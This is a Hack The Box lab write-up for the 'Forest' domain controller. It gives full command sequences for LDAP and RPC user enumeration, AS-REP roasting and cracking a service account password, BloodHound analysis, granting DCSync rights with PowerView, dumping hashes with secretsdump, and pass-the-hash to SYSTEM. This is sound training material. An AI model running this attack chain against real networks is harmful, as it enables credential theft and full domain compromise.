---
layout: post
title: "[HTB] Forest Writeup"
slug: "forest"
date: "2024-04-08"
comments: false
categories:
  - hacking
tags:
  - write up
  - hack the box
  - active directory
---

### Enumeration
Nmap Scan
```bash
> nmap -sCV -v 10.10.10.161
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-04-05 18:32:50Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  Eicrosof     Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 2h26m51s, deviation: 4h02m31s, median: 6m49s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-04-05T11:33:13-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-05T18:33:11
|_  start_date: 2024-04-04T18:28:35
```

We can observe that the host is a Domain Controller for the domain `htb.local` and its FQDN is `FOREST.htb.local`.

Let's use `ldapsearch` and check for anonymous login using `-x` 
```bash
> ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts 
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#
#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Specify the basedn using `-b` where dn is `DC=htb,DC=local` and query for users.
```bash
> ldapsearch -H ldap://10.10.16.161 -x -b "DC=htb,DC=local" '(objectClass=user)' | grep 'sAMAccountName'
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: FOREST$
sAMAccountName: EXCH01$
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi
```

We can filter the return results to include only user accounts, exclude system accounts.
users.txt
```txt
sebastien
lucinda
andy
mark
santi
```

We can also use `rpcclient` with anonymous login to check for domain users.

```bash
> rpcclient -U '' -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> 
```
We discover a new user `svc-alfresco` which is a service account. Add it to the `users.txt`.

We can use `netexec` to check for password policy.
```bash
> netexec smb 10.10.10.161 -u '' -p '' --pass-pol
[*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
[+] htb.local\:
[+] Dumping password info for domain: HTB
Minimum password length: 7
Password history length: 24
Maximum password age: Not Set
Password Complexity Flags: 000000
Domain Refuse Password Change: 0
Domain Password Store Cleartext: 0
Domain Password Lockout Admins: 0
Domain Password No Clear Change: 0
Domain Password No Anon Change: 0
Domain Password Complex: 0
Minimum password age: 1 day 4 minutes
Reset Account Lockout Counter: 30 minutes
Locked Account Duration: 30 minutes
Account Lockout Threshold: None
Forced Log off Time: Not Set
```

Let's use `impacket` tools to check for AS-REP Roasting. 
> Users that does not require Kerberos Pre-Authentication.
![](/images/forest/getNP.png)

Format it for hashcat with crack it.
```bash
> hashcat -m 18200 hash.txt rockyou.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:8ccb40975d4a40d9363ed4171bb5ccae$004bd89de5498ec52e3537dd97d4f8ce7a0712cb2a6ea8c35783da1e27e3dbecad9f586d4312cfaea7de3ce8844b787d9a7e2cbe972b6d1d83e0c6506fb144e6fd4100ae7363d2922bac4516922b1a547cfce22ab9d7279687eceb2e11c19e10e82561c3a842775c07212e152edc4436e4f1551aa19fa35cc9b8a128d362d77fe20b786645cf3d7aea414cfaf4f1412c0e45957c13948a0a26449241ffaf015e77385dbe1a2a158b61e6b09c7cef276272bbb3f9e269dfb126313fb4803811693aa0304e8d696e3b6113023fdf9985619409a9ba26478f82c7d82292ee27e3e84ede1069178c:s3rvice
```

Enumerating all ports in nmap; port 5985 which is winrm is open.
Connect to the port using `evil-winrm`.
```bash
> evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

Next we upload `SharpHound.exe` and enumerate the DC server.
```bash
evil-winrm > upload SharpHound.exe SharpHound.exe
evil-winrm > .\SharpHound.exe -c all
```

Start a smb server on your host.
```bash
> sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py host .
```

Copy to smbserver.
```bash
evil-winrm > copy 2024_BloodHound.zip \\yourip\host\
```

Open the file inside bloodhound, and search for `svc-alfresco` our owned user.
![](/images/forest/svc-alfresco.png)

Right click on the user and mark the user as owned.
![](/images/forest/owned-svc-alfresco.png)

Go to analysis tab and select shortest path from owned principals to see our escalation path.
![](/images/forest/show_paths.png)

Graph showing memberships of groups.
![](/images/forest/graph.png)
We can see that `svc-alfresco` is a member of `Service Accounts` which is a member of `Privilege IT Accounts`, which is a member of `Account Operators` .
Account operators have `generic all` permissions on `exchange` and which inturn have `DACL` on the domain.
Mid-way through the I have change my bloodhound to the newer update community edition. The picture below shows our attack path to escalate our privilege on the domain.

![](/images/forest/path.png)

- Account operators grants its members the ability to create an account.
- The account operators group has `GenericAll` permissions on `Exhange Windows Permission Groups`. This gives members full control of the group and therefore allows members to directly modify group membership and add to it.
- The Exchange Windows Permission group has `WriteDacl` permission on the domain `HTB.LOCAL` which allows abuse of`DcSync` and dump all password hashes. 

###### Steps
1. Create a user on the domain. Privilege from `Account Operator`.
2. Add user to `Exchange Windows Permissions`.	1. 
3. Give the user permission `WriteDacl`.
4. Perform DcSync attack and dump hashes.
5. Pass the Hash to get to administrator account.

**Creating account**
```bash
evil-winrm > net user ngaihte Password123 /add /domain
```
**Adding user to Exchange Windows Permissions**
```bash
evil-winrm > net group "Exchange Windows Permissions" /add ngaihte
```
**Import PowerView and give user DCSync Privileges**
```bash
evil-winrm > Import-Module .\PowerView.ps1
evil-winrm > $pass = convertto-securestring 'Password123' -AsPlainText -Force
evil-winrm > $cred = New-Object System.Management.Automation.PSCredential('htb\ngaihte', $pass)
evil-winrm > Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ngaihte -Rights DCSync 
```
**Use Impacket secretsdump.py to dump hashes**
```bash
> secretsdump.py ngaihte:Password123@10.10.10.161 > dumps.txt
```
**Use Impacket psexec.py to perform pass the hash with administrator account**
```bash
> psexec.py administrator@10.10.10.161 -hashes hash
C:\Windows\system32> whoami
nt authority\system
```
![](/images/forest/pwned.png)